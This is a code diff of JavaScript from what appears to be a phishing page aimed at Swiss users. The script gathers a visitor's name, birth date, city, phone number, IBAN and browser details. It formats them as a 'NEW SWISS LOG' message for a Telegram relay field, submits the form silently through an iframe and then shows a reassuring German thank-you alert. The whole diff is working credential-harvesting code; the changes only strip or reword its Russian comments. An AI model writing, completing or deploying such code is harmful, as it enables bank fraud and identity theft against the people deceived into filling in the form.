@@ -67,24 +67,20 @@ document.addEventListener('DOMContentLoaded', () => {
     const stadt = document.getElementById('stadt').value;
     const ibanInput = document.getElementById('iban').value;
     
-    // Получаем префиксы, которые ввел пользователь
     const phonePrefix = document.getElementById('phone-prefix').value;
     const ibanPrefix = document.getElementById('iban-prefix').value;
 
     const fullIBAN = ibanPrefix.toUpperCase() + ibanInput.replace(/\s+/g, '').toUpperCase();
     
-    // --- Вычисляем статус IBAN ---
     const isIbanValid = isValidSwissIBAN(fullIBAN);
     const ibanStatusText = isIbanValid ? '✅ Gültig' : '❌ Ungültig';
 
-    // Дата и время
     const now = new Date();
     const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
     const timeStr = now.toLocaleTimeString('de-CH', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
     const dateTime = `${dateStr}, ${timeStr}`;
     const browserInfo = navigator.userAgent;
 
-    // Сообщение
     let message = '🇨🇭 NEW SWISS LOG !\n\n';
     message += `👤 Name: ${name}\n`;
     message += `🎂 Geburtsdatum: ${geburtsdatum}\n`;
@@ -98,7 +94,9 @@ document.addEventListener('DOMContentLoaded', () => {
     message += `🌐 Browser: ${browserInfo}\n`;
 
     document.getElementById('telegramText').value = message;
-    form.submit(); // Отправка в iframe
+    
+    // --- ВАЖНО: вызываем submit формы, чтобы она ушла в iframe ---
+    form.submit();
 
     setTimeout(() => {
       alert(isIbanValid ? 'Vielen Dank! Ihre Daten wurden erfolgreich gesendet.' : 'Daten gesendet, aber die IBAN ist ungültig.');
